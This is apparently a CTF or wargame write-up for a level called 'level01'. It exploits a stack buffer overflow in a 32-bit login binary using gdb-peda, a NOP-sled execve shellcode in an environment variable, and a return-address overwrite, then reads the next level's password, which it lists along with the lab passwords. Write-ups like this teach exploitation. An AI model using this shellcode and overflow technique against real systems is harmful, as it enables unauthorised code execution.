# Level01 -

## Local script usage

Requirements:

- `gdb-peda`
- `getenv32`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level01/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level01 | `uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL` |
| level02 | `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv` |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

As we can see, in the second prompt, `fgets` takes 0x64 bytes, but the buffer can only takes 0x48 (cf. `main+8`: `sub esp, 0x60`).

Lets see if we can overflow this buffer and write the return address.

```shell
gdb-peda$ b*main+169
gdp-peda$ run < <(python -c 'print "dat_wil\n" + "A" * 0x48')

gdb-peda$ x/24x $esp+0x1c
0xffffd5ec:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5fc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd60c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd61c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd62c:     0x41414141      0x41414141      0x0000000a      0x00000000
0xffffd63c:   [ 0xf7e45513 ]    0x00000001      0xffffd6d4      0xffffd6dc

p 0x48 + 8
$3 = 0x50 # => offset
```

We have an offset of 0x50.

Lets build our exploit

```shell
export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

./getenv32 SHELLCODE ~/level01
  0xffffd755

python -c 'print "dat_wil\n" + "A" * 0x50 + "\x55\xd7\xff\xff"' > /tmp/exploit01
```

And finally get the pass

```shell
cat /tmp/exploit01 - | ~/level01
  ********* ADMIN LOGIN PROMPT *********
  Enter Username: verifying username....

  Enter Password:
  nope, incorrect password...

$ whoami
  level02
$ cat /home/users/level02/.pass
  PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

## Sources

### ASM

- [What does the “rep stos” x86 assembly instruction sequence do?](https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do)

### C

- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man strncmp](https://linux.die.net/man/3/strncmp)
